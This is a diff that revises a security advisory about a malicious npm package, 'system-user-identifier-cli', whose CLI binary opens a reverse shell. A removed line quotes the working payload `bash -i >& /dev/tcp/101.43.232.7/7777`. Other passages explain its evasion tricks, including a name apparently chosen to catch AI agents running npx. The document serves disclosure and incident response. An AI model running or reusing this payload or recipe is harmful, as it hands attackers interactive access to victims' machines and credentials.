@@ -6,7 +6,7 @@ packageName: system-user-identifier-cli
 ecosystem: npm
 ---
 
-The package is 799 bytes. Two files, a placeholder author, a name that reads like a thousand other one-off `npx` utilities: `system-user-identifier-cli`. The manifest calls it "a simple npx tool to check system user identifier." The binary does check the user. Then it calls home.
+799 bytes, two files, a placeholder author, and a name that reads like a thousand other throwaway `npx` utilities; the manifest calls it "a simple npx tool to check system user identifier," and the binary does check the user before it calls home.
 
 All 17 lines of `index.js`, comments and all:
 
@@ -39,17 +39,11 @@ Translated:
 | `💻 原生命令输出:` | 💻 Native command output: |
 | `执行 id 命令失败:` | id command execution failed: |
 
-Method 2's comment promises `id`; the call is `bash -i >& /dev/tcp/101.43.232.7/7777`. Deliberate misdirection or a tutorial copy with only the payload swapped — either way, the gap is the tell. A reviewer skimming the comments or the printed strings sees a benign two-method demo; only the `execSync` argument breaks the spell.
-
-No staged download, no obfuscation — the payload is the binary itself. Whoever runs it, directly or via `npx`, gets a bash session.
-
-## Why this works
-
-Four layers carry the deception. The output is friendly — a real username, a real platform string. The comments describe a benign two-method demo, priming a reviewer to expect `id` by the time they reach the `execSync` line. The trigger is the declared `bin`, not a `preinstall` script, so scanners that flag lifecycle hooks see nothing. And the name itself, `system-user-identifier-cli`, is not how a human would search for this — a person types something short like `whoami`. It reads like the verbose, descriptive noun-stack an LLM emits when asked to name a package for a stated need. Paired with the one-shot `npx` surface and the tutorial-shaped source, the intended caller may be an agent more than a person.
+Method 2's comment promises `id`; the call is a `bash -i >& /dev/tcp` reverse shell, so a reviewer skimming the friendly output and the two-method comments expects a benign demo, and only the `execSync` argument breaks the spell. There is no staged download and no obfuscation, the trigger is the declared `bin` rather than a `preinstall` hook scanners watch for, and the verbose noun-stack name reads less like something a human would type than like what an LLM emits when asked to name a package for a stated need — paired with the one-shot `npx` surface, the intended caller may be an agent more than a person.
 
 ## Traits observed
 
-The [Fallout report](https://lab.atomdrift.org/file/8b02bd641c856c510d26da46d003ac076dd754f8bab42143b676f9478ed5501e) — [cleave](/cleave/) decomposing, [litmus](/litmus/) grading, the [azoth](/azoth/) model returning a malicious verdict at probability 1.0 — labels the archive against the [open cleave-traits taxonomy](https://codeberg.org/atomdrift/cleave-traits). The high-severity traits tell the story on their own:
+The [Fallout report](https://lab.atomdrift.org/file/8b02bd641c856c510d26da46d003ac076dd754f8bab42143b676f9478ed5501e) labels the archive against the [open cleave-traits taxonomy](https://codeberg.org/atomdrift/cleave-traits), with [azoth](/azoth/) returning a malicious verdict at probability 1.0:
 
 |  | Trait | What it caught |
 | --- | --- | --- |
@@ -62,11 +56,7 @@ The [Fallout report](https://lab.atomdrift.org/file/8b02bd641c856c510d26da46d003
 | <span class="sev-dot notable" title="notable"></span> | `objectives/supply-chain/recon-exfil/install-hook` | Package collects victim identifiers |
 | <span class="sev-dot notable" title="notable"></span> | `metadata/package/fields/bin` | Declared CLI binary as the execution surface |
 
-The reverse shell is not what makes this novel — it is one trait among many. What cleave flags is the *shape*: a placeholder author, a minimal manifest, a declared CLI binary, victim fingerprinting via `os.userInfo`, and a synchronous shell call — assembled into something that reads as a utility and behaves as a beacon.
-
-## Impact
-
-A reverse shell is what its name suggests: the attacker holds an interactive terminal on the host that ran the package, with the privileges of the user who ran it. They type at their console; the victim's machine executes — for as long as the TCP connection holds. On a workstation that exposes SSH agents, npm and GitHub tokens, browser secrets, cloud CLIs, and the contents of every local checkout. On a CI worker it exposes deploy keys, signing material, and the runner's environment. The blast radius is narrower than an automatic `preinstall` compromise — execution has to happen — but anything that runs it should be treated as compromised until proven otherwise.
+The reverse shell hands the attacker an interactive terminal on whatever ran the package, with that user's privileges, for as long as the TCP connection holds — narrower blast radius than a `preinstall` compromise since execution has to happen, but enough to reach SSH agents, npm and GitHub tokens, and CI deploy keys, so treat any host that ran it as compromised.
 
 ## Likely actor
 
@@ -81,9 +71,7 @@ Eight major-version bumps in three hours, from a throwaway gmail under a default
 | Versions published | 1.0.0, 2.0.0, 3.0.0, 4.0.0, 5.0.0, 6.0.0, 7.0.0, 7.0.1 |
 | Downloads API | `package not found` |
 
-The pattern reads like iteration, not a release plan. Every other signal leans cheap: a Tencent Cloud VPS as C2, a hard-coded IP with no DNS, no staging payload, no persistence, `Your Name` in the author field, and the textbook `bash -i >& /dev/tcp/…` one-liner. Chinese comments suggest a probable location. The plausible reading is one person publishing cheaply and waiting to see if `npx` traffic finds the port — a serious campaign would have brought DNS-based C2, a staging payload, and less attributable hosting.
-
-The sophistication isn't what makes this dangerous. The descriptive name, the tutorial-shaped source, and the `bin`-as-trigger are real evasion choices, deliberate or stumbled into. The recipe works, and the next person to use it may not be unsophisticated.
+Every signal leans cheap — a Tencent Cloud VPS for C2, a hard-coded IP with no DNS, no staging, no persistence, `Your Name` in the author field, Chinese comments, and a textbook one-liner — reading like one person publishing cheaply to see if `npx` traffic finds the port, but the recipe works and the next hand on it may not be so unsophisticated.
 
 ## Indicators
 
@@ -98,4 +86,6 @@ The sophistication isn't what makes this dangerous. The descriptive name, the tu
 
 ## Response
 
-Search shell history, npm caches, CI logs, and egress telemetry for the package name and for outbound traffic to `101.43.232.7:7777`. Rotate npm, GitHub, SSH, cloud, and deployment credentials available to any user who ran the binary, from a host that did not. The full trait list and raw analysis live in the [Fallout report](https://lab.atomdrift.org/file/8b02bd641c856c510d26da46d003ac076dd754f8bab42143b676f9478ed5501e); registry metadata came from `npm view system-user-identifier-cli@2.0.0 --json`.
+- Search shell history, npm caches, CI logs, and egress telemetry for the package name and for outbound traffic to `101.43.232.7:7777`.
+- Rotate npm, GitHub, SSH, cloud, and deployment credentials available to any user who ran the binary, from a host that did not.
+- Full trait list and raw analysis: the [Fallout report](https://lab.atomdrift.org/file/8b02bd641c856c510d26da46d003ac076dd754f8bab42143b676f9478ed5501e).
